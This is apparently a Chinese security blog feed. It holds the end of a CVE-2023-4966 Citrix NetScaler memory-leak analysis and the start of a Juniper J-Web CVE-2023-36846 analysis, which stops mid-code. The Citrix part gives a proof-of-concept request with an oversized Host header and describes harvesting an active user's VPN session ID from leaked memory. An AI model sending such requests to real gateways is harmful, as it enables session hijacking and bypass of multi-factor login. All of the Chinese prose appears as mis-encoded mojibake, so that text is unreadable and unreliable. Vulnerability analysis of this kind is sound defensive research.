<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// å‘é€çš„æ•°æ®</span><br><span class="line">GET /oauth/rp/.well-known/openid-configuration HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// è¿”å›çš„æ•°æ®</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-XSS-Protection: 1; mode=block</span><br><span class="line">Content-Length: 308</span><br><span class="line">Cache-control: no-cache, no-store, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">X-Citrix-Application: Receiver for Web</span><br><span class="line"></span><br><span class="line">&#123;&quot;login_endpoint&quot;: &quot;https://127.0.0.1/oauth/login&quot;, &quot;jwks_uri&quot;: &quot;https://127.0.0.1/oauth/rp/certs&quot;, &quot;response_types_supported&quot;: [&quot;code&quot;, &quot;token&quot;, &quot;id_token&quot;], &quot;id_token_signing_alg_values_supported&quot;: [&quot;RS256&quot;], &quot;end_session_endpoint&quot;: &quot;https://127.0.0.1/cgi/tmlogout&quot;, &quot;frontchannel_logout_supported&quot;: false&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// å‘é€çš„æ•°æ®</span><br><span class="line">GET /oauth/idp/.well-known/openid-configuration HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// è¿”å›çš„æ•°æ®</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-XSS-Protection: 1; mode=block</span><br><span class="line">Content-Length: 687</span><br><span class="line">Cache-control: no-cache, no-store, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">X-Citrix-Application: Receiver for Web</span><br><span class="line"></span><br><span class="line">&#123;&quot;issuer&quot;: &quot;https://127.0.0.1&quot;, &quot;authorization_endpoint&quot;: &quot;https://127.0.0.1/oauth/idp/login&quot;, &quot;token_endpoint&quot;: &quot;https://127.0.0.1/oauth/idp/token&quot;, &quot;jwks_uri&quot;: &quot;https://127.0.0.1/oauth/idp/certs&quot;, &quot;response_types_supported&quot;: [&quot;code&quot;, &quot;token&quot;, &quot;id_token&quot;], &quot;id_token_signing_alg_values_supported&quot;: [&quot;RS256&quot;], &quot;end_session_endpoint&quot;: &quot;https://127.0.0.1/oauth/idp/logout&quot;, &quot;frontchannel_logout_supported&quot;: true, &quot;scopes_supported&quot;: [&quot;openid&quot;, &quot;ctxs_cc&quot;], &quot;claims_supported&quot;: [&quot;sub&quot;, &quot;iss&quot;, &quot;aud&quot;, &quot;exp&quot;, &quot;iat&quot;, &quot;auth_time&quot;, &quot;acr&quot;, &quot;amr&quot;, &quot;email&quot;, &quot;given_name&quot;, &quot;family_name&quot;, &quot;nickname&quot;], &quot;userinfo_endpoint&quot;: &quot;https://127.0.0.1/oauth/idp/userinfo&quot;, &quot;subject_types_supported&quot;: [&quot;public&quot;]&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°ä»£ç æŠŠè¯·æ±‚ä¸­çš„ Host è¯·æ±‚å¤´ä½¿ç”¨ snprintf æ‹¼æ¥åˆ° json å­—ç¬¦ä¸²ä¸­ï¼Œç„¶åè¿”å›ç»™ç”¨æˆ·ã€‚è¿™é‡Œæ¶‰åŠä¸€ä¸ª C è¯­è¨€å¸¸è§çš„é—®é¢˜ï¼Œæ ¹æ®æ‰‹å†Œï¼Œsnprintf å‡½æ•°çš„è¿”å›å€¼æ˜¯å¾…æ‹·è´æºæ•°æ®çš„é•¿åº¦ï¼Œè€Œä¸æ˜¯å®é™…æ‹·è´çš„æ•°æ®é•¿åº¦ã€‚å› æ­¤ï¼Œå‡è®¾ç”¨æˆ·ä¼ é€’çš„ Host è¯·æ±‚å¤´é•¿åº¦è¶…è¿‡äº† 0x20000ï¼Œåœ¨è¿›è¡Œæ•°æ®æ‹¼æ¥æ—¶ snprintf å‡½æ•°ä¼šè¿”å›è¶…è¿‡ 0x20000 çš„å€¼ï¼Œåç»­ä»£ç è°ƒç”¨ ns_vpn_send_response å‡½æ•°è¾“å‡ºæ•°æ®æ—¶ä½¿ç”¨çš„æ•°æ®é•¿åº¦è¶…å‡ºäº†ç¼“å†²åŒº print_temp_rule çš„å¤§å°ï¼Œå¯èƒ½å¯¼è‡´è¶Šç•Œè¯»å–é€ æˆå†…å­˜ä¿¡æ¯æ³„éœ²ã€‚</p>
<p>ç†è®ºå¦‚æ­¤ï¼Œä½†å®é™…æµ‹è¯•ä¼šå‘ç°ï¼ŒHost è¯·æ±‚å¤´æœ€é•¿åªèƒ½è¾¾åˆ° 0x60ecï¼Œå¯¹äº <code>ns_aaa_oauthrp_send_openid_config</code> å‡½æ•°æ¥è¯´ï¼ŒHost è¯·æ±‚å¤´ä¼šè¢«å¤åˆ¶ 3 æ¬¡ï¼Œæœ€å¤§é•¿åº¦åªèƒ½è¾¾åˆ° 0x12500ï¼Œå°äº print_temp_rule ç¼“å†²åŒºçš„å¤§å°ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªå‡½æ•°å¯èƒ½æ˜¯æ— æ³•åˆ©ç”¨çš„ã€‚</p>
<p>ä½†å¯¹äºç¬¬äºŒä¸ªå‡½æ•°ï¼Œè§‚å¯Ÿå‘ç° Host è¯·æ±‚å¤´è¢«æ‹·è´äº† 6 æ¬¡ï¼Œé‚£ä¹ˆæ‹·è´æ—¶æºæ•°æ®æœ€å¤§é•¿åº¦å¯ä»¥è¾¾åˆ° 0x24500ï¼Œæ˜¾ç„¶è¶…è¿‡äº† print_temp_rule ç¼“å†²åŒºçš„å¤§å°ï¼Œå¯èƒ½å¯¼è‡´å†…å­˜æ³„éœ²ã€‚</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æˆ‘ä»¬å·²ç»å®šä½åˆ°ä»£ç é—®é¢˜ï¼Œæ¥ä¸‹æ¥æ„é€  PoC è¿›è¡Œæµ‹è¯•ï¼Œæ„é€ å¦‚ä¸‹è¯·æ±‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /oauth/idp/.well-known/openid-configuration HTTP/1.1</span><br><span class="line">Host: &lt;&quot;a&quot; * 0x6000&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>å°†è¯·æ±‚å‘é€åˆ°æœåŠ¡å™¨ï¼Œæ£€æŸ¥å“åº”æ—¶å‘ç°ä» 0x20110 å­—èŠ‚å¼€å§‹è¾“å‡ºäº†å†…å­˜æ•°æ®</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-4966-3.png"
                     
                ></p>
<p>è¿™è¯´æ˜æˆ‘ä»¬çš„åˆ†ææ˜¯æ­£ç¡®çš„ï¼Œè¿™ä¸ªæ¥å£ç¡®å®å­˜åœ¨å†…å­˜ä¿¡æ¯æ³„éœ²çš„é—®é¢˜ã€‚</p>
<p>ä½†æ˜¯è¿›ä¸€æ­¥æ£€æŸ¥è¾“å‡ºçš„æ•°æ®ï¼Œå¹¶æ²¡æœ‰å‘ç°å­˜åœ¨ç”¨æˆ·å¯†ç æˆ–ç±»ä¼¼çš„æ•æ„Ÿä¿¡æ¯ï¼Œå‚è€ƒ Mandiant çš„<a class="link"   href="https://www.mandiant.com/resources/blog/remediation-netscaler-adc-gateway-cve-2023-4966" >æ–‡æ¡£<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>æåˆ°ï¼Œåœ¨é‡æ”»å‡»è€…åˆ©ç”¨è¿™ä¸ªæ¼æ´å®ç° session åŠ«æŒï¼Œæ˜¯å¦éœ€è¦æœ‰æ´»è·ƒçš„ VPN ç”¨æˆ·æ‰èƒ½åˆ©ç”¨æ­¤æ¼æ´å‘¢ï¼Ÿ</p>
<p>æ‰“å¼€ Gateway ç™»å½•ç•Œé¢ï¼Œç™»å½•ä¹‹å‰é…ç½®çš„ç”¨æˆ·ï¼Œç™»å½•åè¿›å…¥å¦‚ä¸‹é¡µé¢</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-4966-4.png"
                     
                ></p>
<p>æ‰“å¼€å¼€å‘è€…å·¥å…·(æˆ–è€…æŠ“åŒ…)ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶è¯·æ±‚ä¸­å·²ç»å…·æœ‰äº† session ä¿¡æ¯</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-4966-5.png"
                     
                ></p>
<p>å†å‘é€æˆ‘ä»¬æ„é€ çš„ payloadï¼Œæ£€æŸ¥å†…å­˜çœ‹åˆ°äº†ç›¸åŒçš„ session ID</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-4966-6.png"
                     
                ></p>
<p>è¿™æ ·æˆ‘ä»¬å°±æˆåŠŸåˆ©ç”¨ä¿¡æ¯æ³„éœ²æ¼æ´è·å–äº†æ´»è·ƒç”¨æˆ·çš„ sessionï¼Œç†è®ºä¸Šåˆ©ç”¨æ­¤ session å³å¯ç™»å½• VPN æœåŠ¡ï¼Œä¸è¿‡ Citrix Gateway çš„åç»­é…ç½®æ¯”è¾ƒå¤æ‚ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥è‡ªè¡Œåˆ†æã€‚</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>CVE-2023-4966 çš„åˆ©ç”¨å‰ææ˜¯éœ€è¦æœ‰æ´»è·ƒçš„ VPN ç”¨æˆ·ï¼Œæ”»å‡»è€…è·å–è¯¥ç”¨æˆ·çš„ session åå¯ä»¥ç»•è¿‡å¤šé‡èº«ä»½éªŒè¯ç™»å½•åˆ° VPN æœåŠ¡ä¸­ï¼Œä»è€Œè®¿é—®æ›´å¤šæ•æ„Ÿèµ„æºã€‚ç”±äºä¸€èˆ¬æƒ…å†µä¸‹ VPN ç”¨æˆ·æ•°é‡ä¼—å¤šï¼Œåˆ©ç”¨è¯¥æ¼æ´èƒ½å¦è·å–ä»¥åŠè·å–çš„ session æ˜¯å¦æœ‰æ•ˆè¦è§†å…·ä½“ç¯å¢ƒè€Œå®šï¼Œå› æ­¤è¯¥æ¼æ´åœ¨å®é™…åœºæ™¯ä¸‹å¯èƒ½å­˜åœ¨ä¸€å®šçš„è¿æ°”æˆåˆ†ã€‚</p>
<p>ä¸è¿‡é‰´äºå·²ç»æ£€æµ‹åˆ°è¯¥æ¼æ´çš„åœ¨é‡åˆ©ç”¨æƒ…å†µï¼Œå»ºè®® Citrix ADC å’Œ NetScaler Gateway ç”¨æˆ·å°½å¿«æ›´æ–°å®˜æ–¹è¡¥ä¸ï¼Œå¹¶æ‰§è¡Œå®˜æ–¹æä¾›çš„ä¿®å¤æªæ–½ã€‚</p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a class="link"   href="https://attackerkb.com/topics/si09VNJhHh/cve-2023-3519/rapid7-analysis" >https://attackerkb.com/topics/si09VNJhHh/cve-2023-3519/rapid7-analysis<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://support.citrix.com/article/CTX579459" >https://support.citrix.com/article/CTX579459<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.mandiant.com/resources/blog/remediation-netscaler-adc-gateway-cve-2023-4966" >https://www.mandiant.com/resources/blog/remediation-netscaler-adc-gateway-cve-2023-4966<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2023-36845 &amp; CVE-2023-36846</title>
    <url>/2023/08/25/CVE-2023-36845-36846/</url>
    <content><![CDATA[<p>2023 å¹´ 8 æœˆï¼ŒJuniper Networks å‘å¸ƒäº†å½±å“ EX å’Œ SRX ä¸­ J-Web ç»„ä»¶çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç›¸å…³ä¿¡æ¯ï¼Œæœ¬æ¬¡å…¬å¼€æœ‰ 4 ä¸ªæ¼æ´ï¼Œå…¶ä¸­ CVE-2023-36845 &amp; CVE-2023-36846 å½±å“ SRX ç³»åˆ—è®¾å¤‡ï¼Œæœ¬æ–‡å¯¹è¿™ä¸¤ä¸ªæ¼æ´è¿›è¡Œåˆ†æã€‚</p>
<span id="more"></span>

<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>é•œåƒä¸‹è½½ï¼Œè¿™é‡Œæä¾› 22.1R2.10 ç‰ˆæœ¬ï¼š<a class="link"   href="https://pan.baidu.com/s/1muIiz7kkIrZA3qIV7lh13A" >https://pan.baidu.com/s/1muIiz7kkIrZA3qIV7lh13A<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> (haxn)</p>
<p>éƒ¨ç½²åå¼€æœºï¼Œç­‰å¾…ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆï¼Œä½¿ç”¨é»˜è®¤ç”¨æˆ· root:ç©ºå¯†ç  ç™»å½•åˆ°åå°ï¼Œæ³¨æ„åˆ° root ç™»å½•åä¼šç›´æ¥è¿›å…¥ linux shellã€‚</p>
<p>å…ˆè¾“å…¥å‘½ä»¤ <code>cli</code>ï¼Œè¿›å…¥æ§åˆ¶ç•Œé¢ï¼Œç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">configure</span><br><span class="line">set system root-authentication plain-text-password</span><br><span class="line">commit</span><br><span class="line"></span><br><span class="line">set interfaces ge-0/0/1 unit 0 family inet address 192.168.88.150/24</span><br><span class="line">set security zones security-zone trust</span><br><span class="line">set security zones security-zone trust interfaces ge-0/0/1.0</span><br><span class="line">set security zones security-zone trust interfaces ge-0/0/1.0 host-inbound-traffic system-services ping</span><br><span class="line">set security zones security-zone trust interfaces ge-0/0/1.0 host-inbound-traffic system-services ssh</span><br><span class="line">set security zones security-zone trust interfaces ge-0/0/1.0 host-inbound-traffic system-services http</span><br><span class="line">set security zones security-zone trust interfaces ge-0/0/1.0 host-inbound-traffic system-services https</span><br><span class="line">set system services web-management http interface ge-0/0/1.0</span><br><span class="line">set system services web-management https system-generated-certificate</span><br><span class="line">set system services web-management https interface ge-0/0/1.0</span><br><span class="line">set system services ssh root-login allow</span><br><span class="line">commit</span><br></pre></td></tr></table></figure></div>

<p>é…ç½®å¥½åè®¿é—® IP:443 å°±å¯ä»¥çœ‹åˆ° J-Web ç™»å½•é¡µé¢ï¼Œç™»å½•è´¦æˆ·ä¸º root:åˆšåˆšè®¾ç½®çš„å¯†ç ã€‚</p>
<h2 id="CVE-2023-36846"><a href="#CVE-2023-36846" class="headerlink" title="CVE-2023-36846"></a>CVE-2023-36846</h2><p>é¦–å…ˆæ¥çœ‹ç¬¬äºŒä¸ªæ¼æ´ï¼ŒCVE é“¾æ¥ï¼š<a class="link"   href="https://www.cve.org/CVERecord?id=CVE-2023-36846" >https://www.cve.org/CVERecord?id=CVE-2023-36846<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æ ¹æ®æè¿°å¯çŸ¥è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æŸä¸ªæ— éœ€èº«ä»½éªŒè¯çš„æ¥å£å‘æ–‡ä»¶ç³»ç»ŸæŸä½ç½®ä¸Šä¼ æ–‡ä»¶ã€‚</p>
<p>SRX çš„ J-Web ç»„ä»¶æ‰€åœ¨ç›®å½•ä¸º <code>/packages/mnt/jweb-srxtvp-8ae76b91/jail</code>ï¼Œè¿™æ˜¯ä¸€ä¸ª chroot ç›®å½•ï¼ŒJ-Web é»˜è®¤è¿è¡Œåœ¨ nobody æƒé™ã€‚</p>
<p>web ç›¸å…³ä»£ç ä½äº html ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬å°†å·²ç»ä¿®å¤çš„ç‰ˆæœ¬å’Œæ—§ç‰ˆæœ¬ä»£ç è¿›è¡Œæ¯”è¾ƒï¼Œæ’é™¤ä¸€äº›æ— å…³æ”¹åŠ¨ä¹‹åå¯ä»¥å®šä½åˆ°æ–‡ä»¶ <code>slipstream/preferences/user.php</code>ï¼Œåˆ—ä¸¾æ–°æ—§ä¸¤ä¸ªç‰ˆæœ¬çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// new</span></span><br><span class="line"><span class="comment">#!/usr/bin/php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;../../main.inc.php&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;USER_PREFERENCE_FILE&#x27;</span>, <span class="string">&#x27;/var/tmp/preference&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http_method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. Cannot find a valid session.&quot;&#125;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. Cannot identify user.&quot;&#125;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$http_method</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;GET&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">get_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;PUT&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">put_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;POST&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">put_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;DELETE&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">delete_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">//echo (&quot;default...&quot;);</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_user_preference_file</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;   </span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$samplejson</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$fp</span>) &#123;       </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$samplejson</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="title function_ invoke__">chmod</span>(USER_PREFERENCE_FILE, <span class="number">0666</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_preference_file_path</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (USER_PREFERENCE_FILE . <span class="string">&quot;.&quot;</span> . <span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_user_preferences</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="comment">//print(&quot;&lt;br/&gt; file = &quot; . $file);</span></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>) ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File not found.&quot;&#125;&#x27;</span>);</span><br><span class="line">		<span class="title function_ invoke__">write_dummy_content</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>, <span class="string">&quot;opening file for reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">is_bool</span>(<span class="variable">$fp</span>) &amp;&amp; <span class="variable">$fp</span> == <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File open failed.&quot;&#125;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">	  <span class="keyword">if</span>(<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_SH)) &#123;</span><br><span class="line">		  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;Unlocked the file for reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">		  <span class="variable">$str</span> = <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$fp</span>);</span><br><span class="line">	  &#125;     </span><br><span class="line">      </span><br><span class="line">      <span class="variable">$fw</span> = <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;closing file for reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fw</span>, <span class="literal">true</span>));</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(!<span class="title function_ invoke__">is_bool</span>(<span class="variable">$str</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)&gt;<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$str</span>);</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;&#123;&#125;&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;error while reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$str</span>, <span class="literal">true</span>));</span><br><span class="line">	  &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> ( <span class="built_in">Exception</span> <span class="variable">$e</span> ) &#123;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error.&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_dummy_content</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	 <span class="keyword">global</span> <span class="variable">$payload</span>;</span><br><span class="line">	 <span class="variable">$payload</span> = <span class="string">&quot;&#123;&#125;&quot;</span>;</span><br><span class="line">	 <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">	 <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$username</span>))</span><br><span class="line">		 <span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">	 <span class="title function_ invoke__">put_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">put_user_preferences</span> (<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;	  </span><br><span class="line">      <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;opening file for writing ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">is_bool</span>(<span class="variable">$fp</span>) &amp;&amp; <span class="variable">$fp</span> == <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File open failed.&quot;&#125;&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		  <span class="keyword">if</span> (<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_EX)) &#123;</span><br><span class="line">			  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;File locked! ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">			  <span class="variable">$fw</span> = <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$payload</span>);</span><br><span class="line">			  <span class="keyword">if</span>(<span class="title function_ invoke__">is_bool</span>(<span class="variable">$fw</span>) &amp;&amp; <span class="variable">$fw</span> == <span class="literal">FALSE</span>) &#123;</span><br><span class="line">				  <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File writing failed.&quot;&#125;&#x27;</span>);</span><br><span class="line">			  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;Payload written to file ... of &quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$fw</span>, <span class="literal">true</span>) . <span class="string">&quot; bytes&quot;</span>);</span><br><span class="line">			  &#125;</span><br><span 